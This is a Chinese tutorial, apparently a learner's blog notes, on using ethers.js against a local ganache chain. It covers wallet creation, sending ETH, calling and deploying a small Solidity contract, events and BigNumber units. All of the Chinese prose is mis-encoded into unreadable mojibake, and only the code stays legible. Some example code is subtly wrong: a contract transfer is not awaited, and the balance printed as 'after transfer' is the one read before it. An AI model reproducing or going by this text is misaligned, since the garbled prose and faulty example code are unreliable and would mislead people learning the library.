æ–¹æ³•äºŒï¼šåˆ©ç”¨ç§é’¥å’Œproviderå®ä¾‹åˆ›å»ºWalletå¯¹è±¡ * è¿™ç§æ–¹æ³•ä¸èƒ½è·å–åŠ©è®°è¯ */const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);console.log(&quot;wallet2 =&gt;\\n&quot;,wallet2);/** * æ–¹æ³•ä¸‰ï¼šåˆ©ç”¨åŠ©è®°è¯åˆ›å»ºWalletå¯¹è±¡ */// ä»åŠ©è®°è¯åˆ›å»ºwalletå¯¹è±¡const wallet3 = ethers.Wallet.fromMnemonic(mnemonic.phrase);console.log(&quot;wallet3 =&gt; &quot;,wallet3); è¿è¡Œç»“æœï¼š 5.4.2 è·å–é’±åŒ…åœ°å€ ä»£ç ï¼š 123456789101112/** * è·å–é’±åŒ…åœ°å€ */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() const address3 = await wallet3.getAddress() // è·å–åœ°å€console.log(`1. è·å–é’±åŒ…åœ°å€`);console.log(`é’±åŒ…1åœ°å€: $&#123;address1&#125;`);console.log(`é’±åŒ…2åœ°å€: $&#123;address2&#125;`);console.log(`é’±åŒ…3åœ°å€: $&#123;address3&#125;`);console.log(`é’±åŒ…1å’Œé’±åŒ…3çš„åœ°å€æ˜¯å¦ç›¸åŒ: $&#123;address1 === address3&#125;`); è¿è¡Œç»“æœï¼š 5.4.3 è·å–åŠ©è®°è¯åˆ©ç”¨é’±åŒ…å¯¹è±¡çš„mnemonicæˆå‘˜è·å–åŠ©è®°è¯ï¼š 1console.log(`é’±åŒ…1åŠ©è®°è¯: $&#123;wallet1.mnemonic.phrase&#125;`) ç»“æœï¼š 5.4.4 åˆ©ç”¨é’±åŒ…å¯¹è±¡çš„ privateKey æˆå‘˜è·å–ç§é’¥ï¼š1console.log(`é’±åŒ…2ç§é’¥: $&#123;wallet2.privateKey&#125;`) è¿è¡Œç»“æœï¼š åˆ°ganacheä¸ŠæŸ¥çœ‹ï¼š ç»“æœæ˜¯ç›¸åŒçš„ã€‚ 5.4.5 è·å–é’±åŒ…åœ¨é“¾ä¸Šçš„äº¤äº’æ¬¡æ•°åˆ©ç”¨ getTransactionCount()å‡½æ•°è·å–é’±åŒ…åœ¨é“¾ä¸Šçš„äº¤äº’æ¬¡æ•° 1234const txCount1 = await wallet1WithProvider.getTransactionCount()const txCount2 = await wallet2.getTransactionCount()console.log(`é’±åŒ…1å‘é€äº¤æ˜“æ¬¡æ•°: $&#123;txCount1&#125;`)console.log(`é’±åŒ…2å‘é€äº¤æ˜“æ¬¡æ•°: $&#123;txCount2&#125;`) è¿è¡Œç»“æœï¼š åˆ°ganacheä¸ŠæŸ¥çœ‹ï¼š 5.4.6 å‘é€ETHæˆ‘ä»¬ç”¨wallet2ç»™wallet1å‘é€0.001 ETHï¼Œå¹¶æ‰“å°äº¤æ˜“å‰åçš„é’±åŒ…ä½™é¢ã€‚ç”±äºwallet1æ˜¯æ–°å»ºçš„éšæœºç§é’¥é’±åŒ…ï¼Œå› æ­¤äº¤æ˜“å‰ä½™é¢ä¸º0ï¼Œè€Œäº¤æ˜“åä½™é¢ä¸º0.001 ETHã€‚ 1234567891011121314151617181920212223242526272829303132333435363738const wallet1 = ethers.Wallet.createRandom();const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);/** * è·å–é’±åŒ…åœ°å€ */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() /** * å‘é€ETH */console.log(&quot; wallet2 ç»™ wallet1 è½¬è´¦0.01ETH&quot;);//äº¤æ˜“å‰ä½™é¢console.log(`é’±åŒ…1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`é’±åŒ…2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`);// æ„å»ºäº¤æ˜“è¯·æ±‚ï¼›toä¸ºæ¥æ”¶åœ°å€ï¼Œvalueä¸ºETHæ•°é¢const TX = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125;// å‘é€äº¤æ˜“ï¼Œè·å¾—æ”¶æ®const recepit = await wallet2.sendTransaction(TX);await recepit.wait();console.log(&quot;receipt =&gt; &quot;,recepit);console.log(&quot;å‘é€åçš„è´¦æˆ·ä½™é¢&quot;);console.log(`é’±åŒ…1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`é’±åŒ…2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`); è¿è¡Œç»“æœï¼š ethers.js_day036. åˆçº¦äº¤äº’6.1 åˆ›å»ºå¯å†™Contractå˜é‡ å£°æ˜å¯å†™çš„Contractå˜é‡çš„è§„åˆ™ï¼š 1const contract = new ethers.Contract(address, abi, signer) è§£è¯»ï¼šå…¶ä¸­ address æ˜¯åˆçº¦åœ°å€ï¼Œabiæ˜¯åˆçº¦çš„abiæ¥å£ï¼Œsingeræ˜¯walletå¯¹è±¡ã€‚å£°æ˜å¯å†™contractéœ€è¦æä¾›signerï¼Œå£°æ˜å¯è¯»contractåªéœ€è¦provider å°†å¯è¯»åˆçº¦è½¬æ¢ä¸ºå¯å†™åˆçº¦ï¼š 1const contract2 = contract.connect(signer) 6.2 åˆçº¦äº¤äº’ è¯»åˆçº¦ä¿¡æ¯ä¸éœ€è¦gasã€‚å†™å…¥åˆçº¦éœ€è¦æ¥å…¥åˆçº¦ä¿¡æ¯ï¼Œæ„å»ºäº¤æ˜“ï¼Œå¹¶æ”¯ä»˜gasã€‚è¯¥äº¤æ˜“å°†ç”±æ•´ä¸ªç½‘ç»œçš„æ¯ä¸ªèŠ‚ç‚¹ä»¥åŠçŸ¿å·¥éªŒè¯ï¼Œå¹¶æ”¹å˜åŒºå—é“¾çŠ¶æ€ã€‚ åˆçº¦äº¤äº’çš„æ–¹æ³•å¦‚ä¸‹ï¼š 1234// å‘é€äº¤æ˜“const tx = await contract.METHOD_NAME(args [, overrides])// ç­‰å¾…é“¾ä¸Šç¡®è®¤äº¤æ˜“await tx.wait() è§£è¯»ä»£ç ï¼šå…¶ä¸­METHOD_NAMEä¸ºè°ƒç”¨çš„å‡½æ•°åï¼Œargsä¸ºå‡½æ•°å‚æ•°ï¼Œ[, overrides]æ˜¯å¯ä»¥é€‰æ‹©ä¼ å…¥çš„æ•°æ®ï¼ŒåŒ…æ‹¬ï¼š gasPriceï¼šgasä»·æ ¼ gasLimitï¼šgasä¸Šé™ valueï¼šè°ƒç”¨æ—¶ä¼ å…¥çš„etherï¼ˆå•ä½æ˜¯weiï¼‰ nonceï¼šnonceï¼ˆéšæœºæ•°ï¼Ÿï¼‰ æ³¨ï¼šæ­¤æ–¹æ³•ä¸èƒ½è·å–åˆçº¦è¿è¡Œçš„è¿”å›å€¼ï¼Œå¦‚è‹¥éœ€è¦è·å–åˆçº¦è¿è¡Œä½ çš„è¿”å›å€¼ï¼Œè¦ä½¿ç”¨Solidityäº‹ä»¶è®°å½•ï¼Œç„¶ååˆ©ç”¨äº¤æ˜“æ”¶æ®å»æŸ¥è¯¢ã€‚ 6.3 ä¾‹å­ï¼šä¸æœ¬åœ°ganacheåˆçº¦äº¤äº’ åˆ›å»ºproviderï¼Œwalletå˜é‡ 123456789&gt;import &#123; ethers &#125; from &quot;ethers&quot;;&gt;// è·å–æœ¬åœ°çš„provider&gt;const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);&gt;// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡&gt;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;&gt;const wallet = new ethers.Wallet(privateKey, provider); åˆ›å»ºå¯å†™åˆçº¦å˜é‡ï¼Œåœ¨æˆ‘è‡ªå·± domo1.solä¸­è°ƒç”¨4ä¸ªå‡½æ•° getSlot0():æŸ¥æ‰¾æ’æ§½0ä½ç½®çš„å€¼ï¼› getSlot1():æŸ¥æ‰¾æ’æ§½1ä½ç½®çš„å€¼ï¼› getSlot2():æŸ¥æ‰¾æ’æ§½2ä½ç½®çš„å€¼ï¼› depoist():è½¬è´¦ï¼› balanceOf():æŸ¥è¯¢åœ°å€ä½™é¢ã€‚ tipsï¼šè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯æ–¹æ³•æ˜¯ä¼ å…¥remixä¸Šè·å–çš„abi 12345678910111213/** * åˆ›å»ºå¯å†™çš„åˆçº¦å˜é‡ */ // è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// åœ¨remixä¸Šéƒ¨ç½²çš„åˆçº¦åœ°å€const contractAddress = &quot;0x5B1557A5AD3cfAC88F3624743BF67baB28723899&quot;;// å£°æ˜å¯å†™åˆçº¦const constract = new ethers.Contract(contractAddress,ABI,wallet); 3.è°ƒç”¨getSlot0ã€1ã€2()ä¸‰ä¸ªå‡½æ•°ï¼ŒæŸ¥çœ‹å…¶å€¼ 12345678910// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`) è¿è¡Œç»“æœï¼š 4.æŸ¥è¯¢è´¦æˆ·çš„ä½™é¢ 123456// éœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`) è¿è¡Œç»“æœï¼š 5.è½¬è´¦æ“ä½œï¼Œæ‰“å°äº¤æ˜“è¯¦æƒ…å’Œä½™é¢ã€‚ 123456//è½¬è´¦let balance1 = await provider.getBalance(test_address);console.log(`è½¬è´¦å‰çš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`è½¬è´¦åçš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) è¿è¡Œç»“æœï¼š ç”±äºvscodeæ˜¾ç¤ºæ•°ä½çš„é—®é¢˜ï¼Œä½¿ç”¨åœ¨remixä¸ŠæŸ¥è¯¢æ˜¾ç¤ºçš„ä½æ•°æ›´å¤š æ³¨ï¼šå¯¹äºépure&#x2F;viewå‡½æ•°çš„è°ƒç”¨ï¼Œä¼šè¿”å›äº¤æ˜“çš„ä¿¡æ¯ã€‚å¦‚æœæƒ³çŸ¥é“å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­åˆçº¦å˜é‡çš„å˜åŒ–ï¼Œå¯ä»¥åœ¨åˆçº¦ä¸­ä½¿ç”¨emitè¾“å‡ºäº‹ä»¶ï¼Œå¹¶åœ¨è¿”å›çš„transactionä¿¡æ¯ä¸­è¯»å–äº‹ä»¶ä¿¡æ¯æ¥è·å–å¯¹åº”çš„å€¼ å®Œæ•´çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);/** * åˆ›å»ºå¯å†™çš„åˆçº¦å˜é‡ */ // è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// åœ¨remixä¸Šéƒ¨ç½²çš„åˆçº¦åœ°å€const contractAddress = &quot;0xf8fe22cA93bD2416a106dFB62168C0D7eBF557FE&quot;;// å£°æ˜å¯å†™åˆçº¦const constract = new ethers.Contract(contractAddress,ABI,wallet);/** * è°ƒç”¨åˆçº¦çš„å‡½æ•° */// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);// éœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`)//è½¬è´¦let balance1 = await provider.getBalance(test_address);console.log(`è½¬è´¦å‰çš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`è½¬è´¦åçš„ä½™é¢ä¸ºï¼š=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 7.éƒ¨ç½²åˆçº¦7.1 åˆçº¦å·¥å‚ ethers.js åˆ›é€ äº†åˆçº¦å·¥å‚ ContractFactoryç±»å‹ï¼Œæ–¹ä¾¿å¼€å‘è€…éƒ¨ç½²åˆçº¦ã€‚ä½ å¯ä»¥åˆ©ç”¨åˆçº¦abiï¼Œç¼–è¯‘å¾—åˆ°çš„å­—èŠ‚ç bytecodeå’Œç­¾åè€…å˜é‡ singer æ¥åˆ›å»ºåˆçº¦å·¥å‚å®ä¾‹ï¼Œä¸ºéƒ¨ç½²åˆçº¦åšå‡†å¤‡ã€‚ 1const contractFactory = new ethers.ContractFactory(abi, bytecode, signer); æ³¨ï¼šå¦‚æœåˆçº¦çš„æ„é€ å‡½æ•°æœ‰å‚æ•°ï¼Œé‚£ä¹ˆåœ¨abiä¸­å¿…é¡»åŒ…å«æ„é€ å‡½æ•°ã€‚ åœ¨åˆ›å»ºå¥½åˆçº¦å·¥å‚ä¹‹åï¼Œå¯ä»¥è°ƒç”¨å®ƒçš„deployå‡½æ•°ï¼Œå¹¶ä¼ å…¥åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•°argsæ¥éƒ¨ç½²å¹¶å¾—åˆ°åˆçº¦å®ä¾‹ï¼š 1const contract = await contractFactory.deploy(args) å¯ä»¥ä½¿ç”¨ä¸¤ç§å‘½ä»¤ï¼Œç­‰å¾…åˆçº¦éƒ¨ç½²åœ¨é“¾ä¸Šç¡®è®¤ï¼Œç„¶åå†è¿›è¡Œäº¤äº’ 12await contractERC20.deployed()//æˆ–è€… await contract.deployTransaction.wait() 7.2 ä¾‹å­ï¼šéƒ¨ç½²æˆ‘è‡ªå·±ç¼–å†™çš„demo1.solåˆçº¦ demo2.sol ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract demo2 &#123; uint slot0; address slot1; string public slot2; // åˆå§‹åŒ–ä¸€äº›å˜é‡ constructor(uint _slot0, address _slot1, string memory _slot2) payable&#123; slot0 = _slot0; slot1 = _slot1; slot2 = _slot2; &#125; function setSlot0(uint num) public &#123; slot0 = num; &#125; function getSlot0() external view returns(uint)&#123; return slot0; &#125; function setSlot1(address _address) public &#123; slot1 = _address; &#125; function getSlot1() external view returns(address)&#123; return slot1; &#125; function setSlot2(string memory _str) public &#123; slot2 = _str; &#125; function getSlot2() external view returns(string memory)&#123; return slot2; &#125; function depoist(uint _amount, address payable _to) external &#123; uint balance = address(this).balance; require(balance &gt; _amount, &quot;You balance is less than your address(this).balance&quot;); _to.transfer(_amount); &#125; function balanceOf(address _address) external view returns(uint) &#123; return address(_address).balance; &#125;&#125; åˆ›å»ºproviderå’Œwalletå˜é‡ 123456789import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider); å‡†å¤‡demo1åˆçº¦çš„å­—èŠ‚ç å’ŒABI(è¿™é‡Œæˆ‘ä½¿ç”¨remixç”Ÿæˆçš„ABI)ã€‚å› ä¸ºdemo2çš„æ„é€ å‡½æ•°å«æœ‰å‚æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŠŠå®ƒåŒ…å«å†ABIä¸­ã€‚åˆçº¦çš„å­—èŠ‚ç å¯ä»¥ä»remixçš„ç¼–è¯‘é¢æ¿ä¸­ç‚¹å‡»bytecodeæŒ‰é’®æ‹·è´ä¸‹æ¥(ä¸ºäº†ä»£ç çš„å¯è¯»æ€§ï¼Œå°†æ‹·è´çš„å­—èŠ‚ç æ–°å»ºä¸€ä¸ª .codeæ–‡ä»¶å­˜æ”¾ï¼Œè·å–çš„æ—¶å€™ ä½¿ç”¨ fsæ¥è¯»å–)ï¼Œå…¶ä¸­â€objectâ€å­—æ®µå¯¹åº”çš„æ•°æ®å°±æ˜¯å­—èŠ‚ç ã€‚å¦‚æœéƒ¨ç½²åœ¨é“¾ä¸Šçš„åˆçº¦ï¼Œä½ å¯ä»¥åœ¨etherscançš„Contracté¡µé¢çš„Contract Creation Codeä¸­æ‰¾åˆ°ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839 // demo2äººç±»å¯è¯»abi /** const demo2ABI = [ &quot;constructor(uint _slot0, address _slot1, string memory _slot2) payable&quot;, ....... ] */ // è¯»å–æ–‡ä»¶çš„abi const ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString()); // è¯»å–æ–‡ä»¶çš„bytecode const byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString(); 3. åˆ›å»ºåˆçº¦å·¥å‚ContractFactoryå®ä¾‹ ```js // åˆ›å»ºåˆçº¦å·¥å‚ ContractFactory å®ä¾‹ const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet); 4. è°ƒç”¨å·¥å‚åˆçº¦çš„deploy() å‡½æ•°å¹¶å¡«å…¥æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œéƒ¨ç½²demo2åˆçº¦å¹¶è·å–åˆçº¦å®ä¾‹ã€‚æœ‰å†™å¸¸ç”¨æ–¹æ³•ï¼š - `contract.address`è·å–åˆçº¦åœ°å€ï¼Œ - `contract.deployTransaction`è·å–éƒ¨ç½²è¯¦æƒ…ï¼Œ - `contractERC20.deployed()`ç­‰å¾…åˆçº¦éƒ¨ç½²åœ¨é“¾ä¸Šç¡®è®¤ã€‚ ```js // åˆ©ç”¨ factoryDemo2 éƒ¨ç½²demo2 åˆçº¦ const gasPrice = await provider.getGasPrice(); const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;; const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction); console.log(`éƒ¨ç½²å¾—åˆ°çš„åˆçº¦åœ°å€ï¼š$&#123;constract.address&#125;`); console.log(&quot;éƒ¨ç½²åˆçº¦çš„äº¤æ˜“è¯¦æƒ…&quot;); console.log(constract.deployTransaction); è°ƒç”¨åˆçº¦å‡½æ•° 12345678910111213/** * è°ƒç”¨åˆçº¦çš„å‡½æ•° */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`); let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); æ‰§è¡Œç»“æœï¼š å®Œæ•´çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// è·å–æœ¬åœ°çš„providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æ ¹æ®ç§é’¥åˆ›å»º walletå¯¹è±¡const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);// è¯»å–æ–‡ä»¶çš„abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString());// è¯»å–æ–‡ä»¶çš„bytecodeconst byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString();// åˆ›å»ºåˆçº¦å·¥å‚ ContractFactory å®ä¾‹const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet);// åˆ©ç”¨ factoryDemo2 éƒ¨ç½²demo2 åˆçº¦const gasPrice = await provider.getGasPrice();const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;;const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction);console.log(`éƒ¨ç½²å¾—åˆ°çš„åˆçº¦åœ°å€ï¼š$&#123;constract.address&#125;`);console.log(&quot;éƒ¨ç½²åˆçº¦çš„äº¤æ˜“è¯¦æƒ…&quot;);console.log(constract.deployTransaction);/** * è°ƒç”¨åˆçº¦çš„å‡½æ•° */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 8.æ£€ç´¢äº‹ä»¶ â€” å¾ˆæœ‰ç”¨8.1 å‚è€ƒåšå®¢ï¼šè¯·ç§»æ­¥ è¿™é‡Œ8.2 æ£€ç´¢äº‹ä»¶ å¯ä»¥åˆ©ç”¨Ethersä¸­åˆçº¦ç±»å‹çš„queryFilter()å‡½æ•°è¯»å–åˆçº¦é‡Šæ”¾çš„äº‹ä»¶ 1const transferEvents = await contract.queryFilter(&#x27;äº‹ä»¶å&#x27;,èµ·å§‹åŒºå—ï¼Œç»“æŸåŒºå—) queryFilter() åŒ…å«3ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯äº‹ä»¶åï¼ˆå¿…å¡«ï¼‰ï¼Œèµ·å§‹åŒºå—ï¼ˆé€‰å¡«ï¼‰ï¼Œå’Œç»“æŸåŒºå—ï¼ˆé€‰å¡«ï¼‰ã€‚æ£€ç´¢ç»“æœä¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›ã€‚ æ³¨ï¼šè¦æ£€ç´¢çš„äº‹ä»¶å¿…é¡»åŒ…å«åœ¨åˆçº¦çš„abiä¸­ã€‚ 9. ç›‘å¬åˆçº¦äº‹ä»¶9.1 ç›‘å¬åˆçº¦äº‹ä»¶ contract.on åœ¨ethersjsä¸­ï¼Œåˆçº¦å¯¹è±¡æœ‰ä¸€ä¸ªcontract.on çš„ç›‘å¬æ–¹æ³•ï¼Œè®©æˆ‘ä»¬æŒç»­ç›‘å¬åˆçº¦çš„äº‹ä»¶ï¼š 1contract.on(&quot;eventName&quot;, function) contract.on æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯è¦ç›‘å¬çš„äº‹ä»¶åç§°â€eventNameâ€ï¼Œéœ€è¦åŒ…å«åˆçº¦abiä¸­ï¼›å¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬åœ¨äº‹ä»¶å‘ç”Ÿæ—¶è°ƒç”¨çš„å‡½æ•° contract.once åˆçº¦å¯¹è±¡æœ‰ä¸€ä¸ªcontract.onceçš„ç›‘å¬æ–¹æ³•ï¼Œè®©æˆ‘ä»¬åªç›‘å¬ä¸€æ¬¡åˆçº¦é‡Šæ”¾äº‹ä»¶ï¼Œå®ƒçš„å‚æ•°ä¸contract.onä¸€æ ·ï¼š 1contract.once(&quot;eventName&quot;,function) 9.2 ç›‘å¬åˆçº¦ç¤ºä¾‹åœ¨è¿™é‡Œ â€”-&gt; here â€¦â€¦â€¦â€¦â€¦â€¦â€¦ 10. äº‹ä»¶è¿‡æ»¤ç°é˜¶æ®µçš„æˆ‘è¿˜ä¸é€‚åˆè€ƒè™‘è¿™äº›ï¼Œæ—¥åå†å­¦ åšå®¢é“¾æ¥ â€¦â€¦â€¦â€¦â€¦â€¦â€¦ 11. BigNumber å’Œ å•ä½è½¬æ¢11.1 BigNumber åœ¨ä»¥å¤ªåŠä¸­ï¼Œè®¸å¤šè®¡ç®—éƒ½å¯¹JavaScriptæ•´æ•°çš„å®‰å…¨å€¼ï¼ˆjsä¸­æœ€å¤§å®‰å…¨æ•°ä¸º9007199254740991ï¼‰ã€‚å› æ­¤ï¼Œethers.jsä½¿ç”¨BigNumber ç±»å®‰å…¨åœ°å¯¹ä»»ä½•æ•°é‡çº§çš„æ•°å­—è¿›è¡Œæ•°å­¦è¿ç®—ã€‚åœ¨ethers.jsä¸­ï¼Œå¤§å¤šæ•°éœ€è¦è¿”å›å€¼çš„æ“ä½œå°†è¿”å›BigNumberï¼Œè€Œæ¥å—å€¼çš„å‚æ•°ä¹Ÿä¼šæ¥å—ä»–ä»¬ã€‚ BigNumberå®˜æ–¹æ–‡æ¡£ 11.2 åˆ›å»ºBigNumberå®ä¾‹ å¯ä»¥åˆ©ç”¨ ethers.BigNumber.from() å‡½æ•°å°†stringï¼Œnumberï¼ŒBigNumberç­‰ç±»å‹è½¬æ¢ä¸ºBigNumberã€‚ æ³¨ï¼šè¶…è¿‡jsæœ€å¤§å®‰å…¨æ•´æ•°çš„æ•°å€¼å°†ä¸èƒ½è½¬æ¢ 1234567const oneGwei = ethers.BigNumber.from(&quot;1000000000&quot;); // ä»åè¿›åˆ¶å­—ç¬¦ä¸²ç”Ÿæˆconsole.log(oneGwei)console.log(ethers.BigNumber.from(&quot;0x3b9aca00&quot;)) // ä»hexå­—ç¬¦ä¸²ç”Ÿæˆconsole.log(ethers.BigNumber.from(1000000000)) // ä»æ•°å­—ç”Ÿæˆ// ä¸èƒ½ä»jsæœ€å¤§çš„å®‰å…¨æ•´æ•°ä¹‹å¤–çš„æ•°å­—ç”ŸæˆBigNumberï¼Œä¸‹é¢ä»£ç ä¼šæŠ¥é”™// ethers.BigNumber.from(Number.MAX_SAFE_INTEGER);console.log(&quot;jsä¸­æœ€å¤§å®‰å…¨æ•´æ•°ï¼š&quot;, Number.MAX_SAFE_INTEGER) è¿è¡Œç»“æœï¼š 11.3 BigNumberè¿ç®— BigNumberæ”¯æŒå¾ˆå¤šè¿ç®—ï¼Œä¾‹å¦‚åŠ å‡ä¹˜é™¤ã€å–æ¨¡modï¼Œå¹‚è¿ç®—powï¼Œç»å¯¹å€¼absç­‰è¿ç®—ï¼š 1234567// è¿ç®—console.log(&quot;åŠ æ³•ï¼š&quot;, oneGwei.add(1).toString())console.log(&quot;å‡æ³•ï¼š&quot;, oneGwei.sub(1).toString())console.log(&quot;ä¹˜æ³•ï¼š&quot;, oneGwei.mul(2).toString())console.log(&quot;é™¤æ³•ï¼š&quot;, oneGwei.div(2).toString())// æ¯”è¾ƒconsole.log(&quot;æ˜¯å¦ç›¸ç­‰ï¼š&quot;, oneGwei.eq(&quot;1000000000&quot;)) è¿è¡Œç»“æœï¼š 11. 4 å•ä½è½¬æ¢ ä»¥å¤ªåŠä¸­ï¼Œ1 ethers ç­‰äº 10^18weiã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„å•ä½ï¼š åœ¨åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸å°†æ•°å€¼åœ¨ç”¨æˆ·å¯è¯»çš„å­—ç¬¦ä¸²ï¼ˆä»¥etherä¸ºå•ä½ï¼‰å’Œæœºå™¨å¯è¯»çš„æ•°å€¼ï¼ˆä»¥weiä¸ºå•ä½ï¼‰ä¹‹é—´è½¬æ¢ã€‚ä¾‹å¦‚ï¼Œé’±åŒ…å¯ä»¥ä¸ºç”¨æˆ·ç•Œé¢æŒ‡å®šä½™é¢ï¼ˆä»¥etherä¸ºå•ä½ï¼‰å’Œgasä»·æ 